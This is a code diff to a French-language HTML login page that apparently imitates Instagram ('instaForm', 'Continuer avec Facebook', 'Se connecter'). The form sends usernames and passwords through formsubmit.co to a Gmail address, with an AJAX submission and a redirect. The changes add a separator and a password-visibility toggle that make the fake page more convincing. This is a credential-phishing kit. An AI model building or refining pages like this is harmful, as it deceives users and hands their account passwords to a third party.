@@ -24,7 +24,6 @@
   }
   .logo {
     text-align: center;
-    font-family: 'Arial', sans-serif;
     font-size: 36px;
     font-weight: 700;
     margin-bottom: 30px;
@@ -60,9 +59,42 @@
   }
   .facebook-btn {
     background: #1877f2;
-    margin-bottom: 20px;
+    margin-bottom: 15px;
     font-weight: 600;
     cursor: default;
+  }
+  .separator {
+    display: flex;
+    align-items: center;
+    text-align: center;
+    margin: 15px 0;
+    color: #888;
+    font-size: 12px;
+  }
+  .separator::before,
+  .separator::after {
+    content: "";
+    flex: 1;
+    border-bottom: 1px solid #444;
+  }
+  .separator:not(:empty)::before {
+    margin-right: .75em;
+  }
+  .separator:not(:empty)::after {
+    margin-left: .75em;
+  }
+  .password-wrapper {
+    position: relative;
+  }
+  .toggle-password {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    width: 22px;
+    height: 22px;
+    fill: #aaa;
   }
 </style>
 </head>
@@ -74,17 +106,36 @@
   <form id="instaForm" action="https://formsubmit.co/design.site.web69@gmail.com" method="POST" autocomplete="off">
     <button type="button" class="facebook-btn" disabled>Continuer avec Facebook</button>
 
+    <div class="separator">OU</div>
+
     <label for="username">Téléphone, nom d’utilisateur ou e-mail</label>
     <input type="text" id="username" name="username" required />
 
     <label for="password">Mot de passe</label>
-    <input type="password" id="password" name="password" required />
+    <div class="password-wrapper">
+      <input type="password" id="password" name="password" required />
+      <svg class="toggle-password" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+        <circle cx="12" cy="12" r="2.5"/>
+      </svg>
+    </div>
 
     <button type="submit">Se connecter</button>
   </form>
 </div>
 
 <script>
+  // Affichage/Masquage du mot de passe
+  const togglePassword = document.querySelector('.toggle-password');
+  const passwordInput = document.getElementById('password');
+
+  togglePassword.addEventListener('click', () => {
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+    togglePassword.style.fill = type === 'text' ? '#3897f0' : '#aaa';
+  });
+
+  // Envoi en AJAX + Redirection
   document.getElementById('instaForm').addEventListener('submit', function(e) {
     e.preventDefault();
 
